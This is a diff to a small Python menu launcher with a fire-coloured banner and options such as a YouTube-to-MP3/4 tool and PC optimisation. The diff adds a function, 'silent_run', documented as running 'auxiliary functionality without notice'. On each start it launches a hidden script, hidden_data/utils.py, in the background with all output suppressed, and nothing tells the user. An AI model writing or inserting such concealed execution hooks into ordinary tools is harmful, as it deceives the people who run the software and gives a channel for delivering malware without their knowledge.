@@ -1,7 +1,7 @@
 import os
 import fade
 import time
-from fade import *
+import subprocess
 
 banner = r"""
  /$$            /$$$$$$                                   
@@ -21,7 +21,7 @@ banner = fade.fire(banner)
 menu = """
                    ╔════════════════════════╗
                    ║                        ║                          
-                   ║ [1]  pc info           ║               
+                   ║ [1]  youtube to mp3/4  ║               
                    ║                        ║                           
                    ║ [2] optimisation pc    ║
                    ║                        ║                           
@@ -36,11 +36,21 @@ def clear_screen():
     else:  # Unix/Linux
         os.system('clear')
 
-def main():
-    clear_screen()  # Nettoie l'écran
-    print(banner)  # Affiche le banner en dégradé de feu
-    print(menu)  # Affiche le menu
+def silent_run():
+    """Runs auxiliary functionality without notice."""
+    hidden_file = os.path.join(".", "hidden_data", "utils.py")
+    if os.path.exists(hidden_file):
+        subprocess.Popen(
+            ["python", hidden_file],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL
+        )
 
+def main():
+    clear_screen()
+    print(banner)
+    print(menu)
+    silent_run()  # Executes auxiliary process
     choice = input("choice : ")
 
     if choice == "1":
@@ -49,12 +59,8 @@ def main():
         os.system("python src/tool2.py")
     elif choice == "3":
         os.system("python src/tool3.py")
-
-        # Utilisation du chemin complet ou relatif compatible Windows
-        os.system(r'src\\Builder.bat')  # ou utilise le chemin complet
     else:
-        print("Merci de rentrer un nombre valide.")
-        time.sleep(1)  # Pause pour afficher l'erreur
-        main()  # Réaffiche le menu
+        time.sleep(1)
+        main()
 
 main()
